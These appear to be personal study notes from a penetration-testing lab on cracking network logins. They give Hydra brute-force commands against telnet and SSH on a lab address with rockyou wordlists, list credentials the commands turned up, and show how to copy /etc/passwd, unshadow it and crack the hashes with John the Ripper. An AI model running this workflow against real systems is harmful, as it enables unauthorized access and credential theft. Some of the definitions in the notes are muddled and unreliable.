Network Attacks 

	- Authentication Cracking
	
		- key difference between John the ripper and THC hydra
			
			***SIDENOTE***
			-John is offline = zip files and hashes that have been downloaded
			-hydra is online = enumaration of ftp passwords

		- Brute Force vs Dictionary Attacks 

			- bruteforce will focus on wordlists 
			- dictionary will have lists of commonly used passwords 

		- Weak and Default Creds

			- network auth cracking relies entirely on dictionary attacks
			- default usernames and passwords 

			- list of common password lists or kali/parrot 
				- *** install the seclists package from github *** 
				- apt-get install seclists
				- /usr/share/seclists

	- Hydra 

		- fast, parallelized, network authentication cracker that supports different protocols 

		- can attack nearly 50 different service types:
			- cisco auth/ftp/http/imap/rdp/smb/ssh/telnet 
			
			- syntax: 
				# hydra -L users.txt -P pass.txt <service://server> <options> 
				
				- -L = login with file ex. users.txt 
				- -l = login with actual user name 

			- example syntax of telnet server 
			
				# hydra -L users.txt -P pass.txt telnet://target.server 

			# creds sysadmin:secret telnet 

			# creds root:123abc ssh 

		Syntax for Telnet: : 

			sudo hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/SecLists/Passwords/Leaked-Databases/rockyou-10.txt telnet://192.168.99.22 

		Syntax for Ssh: 

			sudo hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/SecLists/Passwords/Leaked-Databases/rockyou-10.txt ssh://192.168.99.22



	-Exploitation

		- login into ssh server with 

			- root@192.168.99.22 and verify the location of the /etc/passwd & /etc/shadow

		- now on local machine run to download
			
			- scp root@192.168.99.22:/etc/passwd ./path/of/your/choosing

		- next unshadow the passwords -> create a new file for john the ripper to read  

			- unshadow ./passwd ./shadow > ready_to_crack

	- Finally run John The Ripper -> john will automatically detect the hashes with this command

		- john ready_to_crack
